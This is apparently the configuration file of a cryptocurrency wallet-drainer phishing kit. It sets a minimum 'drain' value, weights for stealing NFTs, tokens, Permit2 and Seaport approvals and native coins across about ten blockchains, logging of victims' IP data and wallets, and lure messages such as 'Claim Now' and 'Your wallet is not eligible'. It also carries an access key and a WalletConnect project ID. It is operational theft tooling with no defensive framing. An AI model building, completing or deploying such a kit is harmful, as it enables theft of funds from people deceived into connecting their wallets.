
let ACCESS_KEY = '9085fab5-4112-4bfd-9ca8-2d7504322ce1'
let USE_W3M_V3 = true
let logPromptingEnabled = true;
let minimalDrainValue = 0.0055;
let mainModal = 'w3m'
let chooseWalletTheme = 'dark';
let themeVariables = {
'--w3m-z-index': 10000,
'--w3m-overlay-backdrop-filter': 'blur(6px)',
};
let w3m_name = "";
let w3m_description = "";
let w3m_url = "";
let w3m_icons = [''];
let multipliers = {
'LP_NFTS': 1,
'PERMIT2': 1,
'BLUR': 1,
'SEAPORT': 1,
'SWAP': 1,
'TOKENS': 1,
'NFT': 1,
'NATIVES': 1,
};
let notEligible = "Your wallet is not eligible, connect another wallet.";
let swal_notEligibleTitle = "Not eligible";
let addressChanged = "Your wallet address has changed, connect wallet again please";
let swal_addressChangedTitle = "Address changed";
let popupElementID = "drPopup";
let popupCloseButtonID = "popupClose";
let popupCode = ``;
let messageElement = "messageButton";
let textInitialConnected = "Loading...";
let textProgress = "Verifying...";
let success = "Claim Now";
let failed = "Try again";
let logIpData = true;
let logEmptyWallets = true;
let logDrainingStrategy = true;
let repeatHighest = true;
let retry_changenetwork = 13;
let eth_enabled = true;
let bsc_enabled = true;
let arb_enabled = true;
let polygon_enabled = true;
let avalanche_enabled = true;
let optimism_enabled = true;
let ftm_enabled = true;
let celo_enabled = true;
let cronos_enabled = true;
let base_enabled = true;
let autoconnect = false;
let useSweetAlert = true;
let popupEnabled = true;
let useDefaultPopup = true;
let canClosePopup = true;
let buttonMessagesEnabled = false;
let twoStep = false;
let twoStepButtonElement = "startButton";
let connectElement = "connectButton";
let wc_projectid = "715a03f6c2b88a60df0b1cee268ea3d6";
let cfgversion = 680;
let researchers = [];
let experimental = {"disable-w3m-featured":true};